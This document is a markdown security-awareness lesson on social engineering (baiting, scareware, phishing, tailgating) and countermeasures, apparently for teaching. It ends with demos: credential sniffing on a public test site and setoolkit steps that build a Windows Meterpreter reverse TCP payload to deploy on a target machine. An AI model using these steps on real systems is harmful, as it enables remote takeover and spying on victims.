<h1 align="center">Personal Privacy<h1>

## 1. Safe Browsing

1. Disable request to save password
2. Use incognito mode
3. use password manager
4. Be caution while using http website (**vulnerable to MiM attack**)
5. Never install software from unknown source on computer 
6. Never use WINDOW-7

## 2. Social Engineering Attack

Social engineering is an attack vector that relies heavily on human interaction and often involves manipulating people into breaking normal security procedures and best practices to gain unauthorized access to systems, networks or physical locations or for financial gain.

## 3. Types of social engineering attack

#### Baiting (ငါးစာတပ်သည်)

- An attacker leaves a malware-infected physical device (USB) in certain area (eg. bathroom, elevator, ther parking lot of targetd company)
- The target then picks up the device and inserts it into their computer, unintentionally installing the malware

#### Scareware
- false alarms of critical threat
- promoting them to install software with malware or virus

#### Phishing

 phishing scams are email and text message campaigns aimed at creating a sense of urgency, curiosity or fear in victims

- An example is an email sent to users of an online service that alerts them of a policy violation requiring immediate action on their part, such as a required password change. 
- It includes a link to an illegitimate website—nearly identical in appearance to its legitimate version—prompting the unsuspecting user to enter their current credentials and new password

#### Spear Phishing 

This is a more targeted version of the phishing scam whereby an attacker chooses specific individuals or enterprises

- A spear phishing scenario might involve an attacker who, in impersonating an organization’s IT consultant, sends an email to one or more employees

#### Tailgating (ကားမောင်းတဲ့အခါမှာ တစ်ခြားကားရဲ့အနောက်ကို တအားကပ်ပြီးလိုက်တဲ့ အဓိပ္ပါယ်)

In these types of attacks, someone without the proper authentication follows an authenticated employee into a restricted area

- In these types of attacks, someone without the proper authentication follows an authenticated employee into a restricted area
- When an employee gains security’s approval and opens the door, the attacker asks the employee to hold the door, thereby gaining access to the building

- Tailgating does not work in the presence of certain security measures such as a keycard system. However, in organizations that lack these features, attackers can strike up conversations with employees and use this show of familiarity to get past the front desk

## 4. Social Engineering Countermeasure

- Do not open any emails from unknown sources. Contact a friend or family member in person or by phone if you receive a suspicious email message from them.
- Do not give offers from strangers the benefit of the doubt. If they seem too good to be true, they probably are.
- Lock your laptop whenever you are away from your workstation.
- Purchase anti-virus software. No AV solution has a 100% detection rate, but they can help to defend against campaigns that use social engineering tactics.
- Read your company’s privacy policy to understand under what circumstances you can or should let a stranger into the building.





<h1 align="center">Demo Time</h1>






## 1. Demo Man in the middle attack


![MiM attack](../../photo/mim.png)

- Go to `http://testphp.vulnweb.com/`
- `sudo wireshark`
- capture the packet and look using filter `http.request.method=="POST"`



## 2. Demo Social Engineering

Objective - To show how dangerous software from unknown source

1. `sudo setoolkit`
2. choose `social-engineering Attacks` and `create a payload and listener`
3. use `5` ==> `Window Meterpreter Reverse_TCP`
4. Type LHOST IP 

5. copy payload to **WINDOW COMPUTER**

6. use command `screenshot`